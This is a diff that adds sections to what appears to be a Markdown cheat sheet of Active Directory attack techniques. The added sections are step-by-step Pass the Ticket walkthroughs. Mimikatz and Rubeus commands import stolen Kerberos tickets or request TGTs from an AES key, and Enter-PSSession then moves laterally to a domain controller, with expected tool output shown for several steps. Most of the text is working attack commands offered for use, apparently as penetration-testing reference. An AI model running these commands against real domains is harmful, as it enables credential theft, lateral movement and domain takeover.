@@ -4586,6 +4586,155 @@ To initiate a PowerShell Remoting session on a remote system, a user must meet o
 
 Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
 
+<details>
+<summary><h5>Mimikatz - Pass the Ticket for lateral movement</h5></summary>
+
+To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine.
+
+**Start Mimikatz as Adminitrator**
+
+```cmd
+mimikatz.exe
+```
+
+**Perform the Pass the Ticket attack**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi"
+mimikatz # exit
+```
+
+**Start PowerShell**
+
+```cmd
+powershell
+```
+
+**Connect to the target machine**
+
+```powershell
+Enter-PSSession -ComputerName DC01
+```
+
+**Verify your current session**
+
+```powershell
+whoami
+```
+
+**Expected output**
+
+```powershell
+<DOMAIN>\<USER>
+```
+
+</details>
+
+</details>
+
+<details>
+<summary><h4>Rubeus - PowerShell Remoting with Pass the Ticket</h4></summary>
+
+Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). By default, the process is hidden; use the /show flag to display it. This prevents the erasure of existing TGTs for the current logon session.
+
+**Create a sacrificial process with Rubeus:**
+
+```cmd
+Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+```
+
+**Expected output**
+
+```cmd
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.3
+
+
+[*] Action: Create process (/netonly)
+
+
+[*] Using random username and password.
+
+[*] Showing process : True
+[*] Username        : JMI8CL7C
+[*] Domain          : DTCDV6VL
+[*] Password        : MRWI6XGI
+[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 1556
+[+] LUID            : 0xe07648
+```
+
+The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.
+
+</details>
+
+<details>
+<summary><h4>Rubeus - Pass the Ticket for lateral movement</h4></summary>
+
+```cmd
+Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES_KEY> /ptt
+```
+
+**Expected output**
+
+```powershell
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.3
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: <AES_KEY>
+[*] Building AS-REQ (w/ preauth) for: '<DOMAIN>\<USER>'
+[*] Using domain controller: <IP>:<PORT>
+[+] TGT request successful!
+[*] Base64(ticket.kirbi):
+      <BASE64_TICKET>
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/<DOMAIN>
+  ServiceRealm             :  <DOMAIN>
+  UserName                 :  <USER>
+  UserRealm                :  <DOMAIN>
+  StartTime                :  7/18/2025 5:44:50 AM
+  EndTime                  :  7/18/2025 3:44:50 PM
+  RenewTill                :  7/25/2025 5:44:50 AM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
+  ASREP (key)              :  <AES_KEY>
+```
+
+**Connect to the target machine**
+
+```powershell
+Enter-PSSession -ComputerName DC01
+```
+
+**Verify your current session**
+
+```powershell
+whoami
+```
+
+**Expected output**
+
+```powershell
+<DOMAIN>\<USER>
+```
+
 </details>
 
 </details>
